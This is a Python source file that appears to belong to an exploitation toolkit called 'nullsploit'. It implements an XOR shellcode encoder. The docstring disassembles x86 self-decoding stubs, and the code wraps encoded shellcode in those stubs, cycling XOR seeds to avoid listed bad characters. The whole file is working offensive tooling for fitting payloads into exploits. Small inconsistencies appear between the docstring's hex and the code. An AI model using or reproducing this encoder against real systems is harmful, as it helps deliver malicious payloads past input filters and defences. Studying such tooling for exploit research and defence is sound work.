#!/usr/bin/env python
"""
    nullsploit :: XOR encoder

    AUTHOR :: TheXero
    WEBSITE :: www.nullsecurity.net
    
ECX = end of shellcode
EAX = start of shellcode
stub8
00401000 >   33C9           XOR ECX,ECX                              ; Zero ECX
00401002     E8 FFFFFF      CALL OLLYDBG.00401006                    ; Push EIP
00401006     FFC1           INC ECX                                  ; Increase ECX
00401008     58             POP EAX                                  ; Get EIP
00401009     B1 FF          MOV CL,0FF                               ; Mov length of shellcocde into CL
0040100B     03C8           ADD ECX,EAX                              ; Add EIP to EXC
0040100D     8070 0F 0F     XOR BYTE PTR DS:[EAX+F],0F               ; XOR byte at EAX+0F with seed
00401011     40             INC EAX                                  ; Increase EAX
00401012     3BC1           CMP EAX,ECX                              ; Compare ECX to EAX
00401014    ^75 F7          JNZ SHORT OLLYDBG.0040100D               ; If not, return to XOR

33 C9 E8 FF FF FF FF C1 58 B1 FF 03 C8 80 70 0F 0F 40 3B C1 75 F7

stub16
00401000 >   33C9           XOR ECX,ECX
00401002     E8 FFFFFF      CALL OLLYDBG.00401006
00401006     FFC1           INC ECX
00401008     66:B9 FF00     MOV CX,0FF
0040100C     58             POP EAX
0040100D     03C8           ADD ECX,EAX
0040100F     8070 11 0F     XOR BYTE PTR DS:[EAX+11],0F
00401013     40             INC EAX
00401014     3BC1           CMP EAX,ECX
00401016    ^75 F7          JNZ SHORT OLLYDBG.0040100F

33 C9 EB FF FF FF FF C1 66 B9 FF 00 58 03 C8 80 70 11 0F 40 3B C1 75 F7
"""
from struct import pack
from exploitutils import *

def encoder(shellcode, seed):
    
    encoded_shellcode = bytearray(shellcode)
    for i in range (len(shellcode)):
        encoded_shellcode[i] ^= seed
        
    return encoded_shellcode

def stub8(length, seed):    
    stub="\x33\xC9\xE8\xFF\xFF\xFF\xFF\xC1\x58\xB1%s\x03\xC8\x80\x70\x0F%s\x40\x3B\xC1\x75\xF7" % (chr(length), chr(seed))
    return stub

def stub16(length, seed):
    stub="\x33\xC9\xE8\xFF\xFF\xFF\xFF\xC1\x66\xB9%s\x58\x03\xC8\x80\x70\x11%s\x40\x3B\xC1\x75\xF7" %(pack('<h',length), chr(seed))
    return stub

def detect_badchar(shellcode, badchars):

    array = []
    for badchar in badchars:
        array.append(badchar)
        for i in array:
            if i in shellcode:
                return False
    return True    

def generate(shellcode, badchars):
    seed = 0x00
    if len(shellcode) < 256:      
        new_shellcode = stub8(len(shellcode), seed)
        new_shellcode+= encoder(shellcode, seed)         
        for char in new_shellcode:
            result = detect_badchar(new_shellcode, badchars)
            if result == True:
                break
            else:
                if seed != 0xff:
                    seed+=1
                else:
                    print_bad("Encoding failed")
                    exit()
            new_shellcode = stub8(len(shellcode), seed)
            new_shellcode+= encoder(shellcode, seed)    
            
        #print_update("Shellcode length: %s" % len(new_shellcode))
        return new_shellcode
    elif len(shellcode) < 65535:
        new_shellcode = stub16(len(shellcode), seed)
        new_shellcode+= encoder(shellcode, seed)         
        for char in new_shellcode:
            result = detect_badchar(new_shellcode, badchars)
            if result == True:
                break
            else:
                if seed != 0xff:
                    seed+=1
                else:
                    print_bad("Encoding failed!")
                    exit()
            new_shellcode = stub16(len(shellcode), seed)
            new_shellcode+= encoder(shellcode, seed)                              
                    
        #print_status("Shellcode length: %s" % len(new_shellcode))
        return new_shellcode    
    else:
        print_bad("Shellcode too large!")
        exit()
